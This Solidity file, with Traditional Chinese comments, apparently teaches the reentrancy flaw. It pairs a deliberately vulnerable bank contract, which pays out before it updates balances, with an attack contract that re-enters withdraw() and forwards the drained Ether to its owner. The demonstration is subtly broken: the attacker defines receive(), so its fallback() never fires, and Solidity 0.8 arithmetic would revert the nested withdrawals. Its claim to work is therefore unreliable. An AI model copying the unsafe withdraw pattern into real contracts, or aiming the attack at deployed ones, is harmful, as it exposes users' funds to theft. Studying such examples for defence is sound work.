// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞名稱: Reentrancy
  描述: 漏洞發生在未遵循 checks-effects-interactions 模式中，在 withdraw() 函式中，
        先執行外部呼叫 (將 Ether 轉移給 msg.sender) 後才更新狀態，
        造成攻擊者可在轉帳過程中重入 withdraw() 以提取超出餘額的資金。
  攻擊手法:
        1. 部署 VulnerableBank 合約。
        2. 部署 ReentrancyAttack 合約，傳入 VulnerableBank 的地址 (需以 payable address 傳入)。
        3. 攻擊者先向 VulnerableBank 進行存款後，再呼叫 attack() 發起攻擊，
           利用 fallback() 的重入呼叫多次提款。
  注意:
        1. 修改 constructor 參數型態為 address payable 以符合 Solidity >=0.8.0 的要求。
        2. 為避免警告，加入 receive() 函式處理 Ether 接收。
*/

contract VulnerableBank {
    // 狀態變數記錄各使用者的餘額 // 漏洞重點
    mapping(address => uint) public balances;

    // 存款函式
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞: withdraw() 函式存在重入漏洞
    function withdraw(uint _amount) public {
        // 驗證使用者餘額是否足夠 // 漏洞重點
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 外部呼叫：先轉帳給使用者，再更新狀態  // 漏洞重點
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Transfer failed");

        // 狀態更新在轉帳後執行 // 漏洞重點
        balances[msg.sender] -= _amount;
    }

    // 為避免警告，補上 receive() 函式以接收 Ether
    receive() external payable {}
}

// 攻擊合約，用以展示如何利用 reentrancy 漏洞進行攻擊
contract ReentrancyAttack {
    VulnerableBank public vulnerable;
    address public owner;

    // 修改參數型態為 address payable，符合 Solidity >=0.8.0 的要求
    constructor(address payable _vulnerable) {
        vulnerable = VulnerableBank(_vulnerable);
        owner = msg.sender;
    }

    // 攻擊入口：先存款再觸發 withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        // 儲存足夠 Ether 至 VulnerableBank
        vulnerable.deposit{value: msg.value}();
        // 發起提款，觸發 withdraw() 裡的外部呼叫，進而進入 fallback 進行重入攻擊
        vulnerable.withdraw(msg.value);
    }

    // 補上 receive() 函式以接收 Ether，避免警告
    receive() external payable {}

    // fallback() 被呼叫時，進行重入呼叫 withdraw()，持續提取資金
    fallback() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether);
        }
    }

    // 將合約中的 Ether 轉回 owner
    function collect() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
